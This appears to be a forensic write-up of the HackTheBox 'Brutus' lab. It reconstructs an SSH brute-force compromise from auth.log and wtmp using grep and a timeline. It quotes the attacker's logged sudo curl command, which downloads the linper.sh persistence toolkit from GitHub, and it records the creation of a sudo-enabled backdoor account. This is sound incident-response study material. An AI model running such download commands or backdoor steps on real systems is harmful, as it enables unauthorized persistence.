# Architecture — HTB Brutus Sherlock

**Investigation environment, artifact structure, and attack infrastructure**

---

## Lab Environment

This investigation used the HackTheBox Sherlock — Brutus challenge. No live systems were involved. The artifacts provided represent a real-world compromised server scenario.

```
┌─────────────────────────────────────────────────────────┐
│                    INVESTIGATION SETUP                   │
│                                                         │
│  ┌──────────────────┐         ┌──────────────────────┐  │
│  │   Analyst Host   │         │  Target (Simulated)  │  │
│  │                  │         │                      │  │
│  │  Kali Linux      │         │  Confluence Server   │  │
│  │                  │         │  Ubuntu Linux        │  │
│  │  Tools:          │         │  SSH port 22 exposed │  │
│  │  - grep          │◀────────│                      │  │
│  │  - sort/uniq     │ analyze │  Artifacts provided: │  │
│  │  - utmp.py       │         │  - auth.log          │  │
│  │  - less          │         │  - wtmp (binary)     │  │
│  └──────────────────┘         └──────────────────────┘  │
└─────────────────────────────────────────────────────────┘
```

---

## Artifact Structure

### auth.log
**Location on system:** `/var/log/auth.log`
**Format:** Plain text — syslog format
**Contents:** All authentication events on the system

```
<Month> <Day> <Time> <hostname> <process>[PID]: <message>

Example:
Mar  6 06:31:33 server sshd[2413]: Failed password for root from 65.2.161.68 port 47001 ssh2
Mar  6 06:31:40 server sshd[2421]: Accepted password for root from 65.2.161.68 port 34782 ssh2
Mar  6 06:34:18 server useradd[2667]: new user: name=cyberjunkie, UID=1002, GID=1002
```

**Key event types recorded:**

| Event | Log Pattern |
|---|---|
| Failed SSH login | `Failed password for <user> from <ip>` |
| Successful SSH login | `Accepted password for <user> from <ip>` |
| Session opened | `pam_unix(sshd:session): session opened for user <user>` |
| Session closed | `pam_unix(sshd:session): session closed for user <user>` |
| New user created | `useradd: new user: name=<user>, UID=<n>` |
| Group modification | `usermod: add '<user>' to group '<group>'` |
| sudo command | `sudo: <user> : COMMAND=<cmd>` |

### wtmp
**Location on system:** `/var/log/wtmp`
**Format:** Binary — cannot be read directly
**Contents:** Interactive login session records

```
Fields recorded per session:
- Username
- Terminal / PTY assigned (e.g., pts/0)
- Source IP address
- Session start timestamp (local system time)
```

**How to parse:**
```bash
# Using provided utmp.py script
python3 utmp.py wtmp

# Using system last command
last -f wtmp

# Sample output
root     pts/0        65.2.161.68      Wed Mar  6 06:32   still logged in
root     pts/0        65.2.161.68      Wed Mar  6 06:31 - 06:31  (00:00)
```

**Key distinction from auth.log:**

| | auth.log | wtmp |
|---|---|---|
| Records | Password acceptance by SSH daemon | Terminal session establishment by OS |
| Timestamp | When SSH daemon accepted password | When interactive terminal was spawned |
| Gap | — | 1 second after auth.log (processing latency) |
| Format | Plain text | Binary |

---

## Attack Infrastructure

```
┌──────────────────────────────────────────────────────────────────┐
│                     ATTACK INFRASTRUCTURE                        │
│                                                                  │
│  ┌─────────────────┐                  ┌───────────────────────┐  │
│  │   Attacker      │                  │   Target Server       │  │
│  │                 │                  │                       │  │
│  │  IP:            │   SSH port 22    │  Confluence Server    │  │
│  │  65.2.161.68    │─────────────────▶│  Ubuntu Linux        │  │
│  │                 │   165+ failures  │  10.x.x.x (internal) │  │
│  │  Tool:          │   then success   │                       │  │
│  │  Hydra/Medusa   │                  │  Services:            │  │
│  │  (automated)    │                  │  - SSH (port 22)      │  │
│  └─────────────────┘                  │  - Confluence (web)   │  │
│                                       └───────────────────────┘  │
│                                                                  │
│  ┌─────────────────────────────────────────────────────────┐     │
│  │              PERSISTENCE INFRASTRUCTURE                  │     │
│  │                                                         │     │
│  │  GitHub Raw (external)                                  │     │
│  │  raw.githubusercontent.com/montysecurity/linper/main/   │     │
│  │                                                         │     │
│  │  linper.sh — Linux Persistence Toolkit                  │     │
│  │  Downloaded by: cyberjunkie (backdoor account)          │     │
│  │  Method: sudo /usr/bin/curl <url>                       │     │
│  └─────────────────────────────────────────────────────────┘     │
└──────────────────────────────────────────────────────────────────┘
```

---

## Attack Phases & Log Artifacts

```
PHASE 1 — BRUTE FORCE
─────────────────────
auth.log entries:
  sshd: Failed password for <user> from 65.2.161.68
  (×165 across multiple usernames)

Observable signals:
  - High failure volume from single IP
  - Multiple usernames tried (root, admin, backup, server_adm)
  - Sub-second intervals between attempts = automation

────────────────────────────────────────────
PHASE 2 — AUTOMATED CREDENTIAL CONFIRMATION
────────────────────────────────────────────
auth.log entries:
  sshd: Accepted password for root from 65.2.161.68 port 34782
  pam_unix: session opened for user root       ← Session 34 opens
  pam_unix: session closed for user root       ← Session 34 closes (same second)

Observable signals:
  - Session 34: open + close within same second = automated tool

────────────────────────────────────────────
PHASE 3 — MANUAL INTERACTIVE SESSION
────────────────────────────────────────────
auth.log entries:
  sshd: Accepted password for root from 65.2.161.68 port 53184  ← 06:32:44
  pam_unix: session opened for user root                         ← Session 37 opens

wtmp artifact:
  root  pts/0  65.2.161.68  2024-03-06 06:32:45 UTC             ← 1s after auth.log

Observable signals:
  - Session 37: stable, open without immediate close = human operator
  - 1s gap between auth.log and wtmp = normal processing latency

────────────────────────────────────────────
PHASE 4 — PERSISTENCE INSTALLATION
────────────────────────────────────────────
auth.log entries:
  useradd: new user: name=cyberjunkie, UID=1002
  usermod: add 'cyberjunkie' to group 'sudo'

Observable signals:
  - New account created within 2 minutes of interactive login
  - Immediately added to sudo group = full privileges

────────────────────────────────────────────
PHASE 5 — SESSION END & ACCOUNT PIVOT
────────────────────────────────────────────
auth.log entries:
  pam_unix: session closed for user root  ← 06:37:24 (Session 37 ends)
  sshd: Accepted password for cyberjunkie from 65.2.161.68
  pam_unix: session opened for user cyberjunkie

Observable signals:
  - Root session lasted exactly 4m 39s
  - Immediate re-login as cyberjunkie = attacker pivots to backdoor

────────────────────────────────────────────
PHASE 6 — PERSISTENCE TOOLKIT DOWNLOAD
────────────────────────────────────────────
auth.log entries:
  sudo: cyberjunkie : COMMAND=/usr/bin/curl
        https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh

Observable signals:
  - sudo + curl to external raw GitHub URL = living-off-the-land download
  - linper.sh = known Linux persistence toolkit
```

---

## Log Analysis Tool Chain

```
auth.log (plain text)
        │
        ├── grep sshd auth.log | grep "Failed password"
        │   └── IP frequency: sort | uniq -c | sort -rn
        │       └── Identifies attacker IP (65.2.161.68, 165 hits)
        │
        ├── grep "Accepted password" auth.log | grep 65.2.161.68
        │   └── Confirms root compromise
        │
        ├── grep "session opened" auth.log | grep 65.2.161.68
        │   └── Identifies Session 34 (automated) vs Session 37 (manual)
        │
        ├── grep "useradd\|usermod" auth.log
        │   └── Confirms cyberjunkie creation + sudo escalation
        │
        ├── grep "session closed for user root" auth.log
        │   └── Session 37 end time: 06:37:24
        │
        └── grep "sudo.*COMMAND" auth.log | grep cyberjunkie
            └── linper.sh download command recovered

wtmp (binary)
        │
        └── python3 utmp.py wtmp
            └── Manual session timestamp: 2024-03-06 06:32:45 UTC
                (1 second after auth.log password acceptance — expected)
```

---

## Key Timestamps

| Timestamp (UTC) | Event | Artifact | Log Entry |
|---|---|---|---|
| Prior to 06:31 | Brute force begins | auth.log | `Failed password for root from 65.2.161.68` |
| 06:31:40 | Root creds confirmed (automated) | auth.log | Session 34 open + close same second |
| 06:32:44 | Manual auth accepted | auth.log | `Accepted password for root` |
| 06:32:45 | Terminal session spawned | wtmp | root pts/0 65.2.161.68 |
| 06:34:18 | Backdoor account created | auth.log | `useradd: new user: name=cyberjunkie` |
| 06:34:31 | Sudo escalation | auth.log | `usermod: add 'cyberjunkie' to group 'sudo'` |
| 06:37:24 | Root session closed | auth.log | `session closed for user root` |
| 06:39:14 | Persistence script downloaded | auth.log | `COMMAND=/usr/bin/curl ...linper.sh` |
